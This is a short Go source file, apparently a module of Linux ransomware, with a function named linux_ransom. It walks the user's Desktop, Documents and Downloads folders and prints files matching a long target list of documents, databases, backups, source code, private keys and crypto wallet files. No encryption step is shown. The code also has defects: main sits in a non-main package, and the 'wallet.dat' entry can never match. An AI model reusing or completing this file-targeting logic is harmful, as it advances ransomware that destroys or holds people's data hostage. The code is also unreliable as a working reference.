package modules

import (
	"fmt"
	"os"
	"path/filepath"
)

var extensions = []string{".mp4", ".avi", ".mp3", ".jpg", ".odt", ".mid", ".wma", ".flv",
	".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf",
	".wav", ".qcow2", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tbk", ".bak", ".djv",
	".djvu", ".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif",
	".tiff", ".NEF", ".psd", ".cmd", ".bat", ".class", ".java", ".asp", ".brd",
	".sch", ".dch", ".dip", ".vbs", ".asm", ".pas", ".cpp", ".php", ".ldf", ".mdf",
	".ibd", ".MYI", ".MYD", ".frm", ".odb", ".dbf", ".mdb", ".sql", ".SQLITEDB",
	".SQLITE3", ".asc", ".lay6", ".lay", ".ms11", ".sldm", ".sldx", ".ppsm",
	".ppsx", ".ppam", ".docb", ".mml", ".sxm", ".otg", ".odg", ".uop", ".potx",
	".potm", ".pptx", ".pptm", ".std", ".sxd", ".pot", ".pps", ".sti", ".sxi",
	".otp", ".odp", ".wks", ".xltx", ".xltm", ".xlsx", ".xlsm", ".xlsb", ".slk",
	".xlw", ".xlt", ".xlm", ".xlc", ".dif", ".stc", ".sxc", ".ots", ".ods", ".hwp",
	".dotm", ".dotx", ".docm", ".docx", ".DOT", ".max", ".xml", ".txt", ".CSV",
	".uot", ".RTF", ".pdf", ".XLS", ".PPT", ".stw", ".sxw", ".ott", ".odt",
	".DOC", ".pem", ".csr", ".crt", ".key", "wallet.dat",
}

var locationsToLook = []string{"/Desktop/", "/Documents/", "/Downloads/"}

func visit(path string, f os.FileInfo, err error) error {
	fmt.Printf("Visited: %s\n", path)

	for _, b := range extensions {
		if filepath.Ext(path) == b {
			fmt.Printf("%s\n", path)
		}
	}
	return nil
}

func linux_ransom() {
	home_location := os.Getenv("HOME")
	for _, location := range locationsToLook {
		err := filepath.Walk(home_location+location, visit)
		fmt.Printf("filepath.Walk() returned %v\n", err)
	}

}

func main() {
	linux_ransom()
}
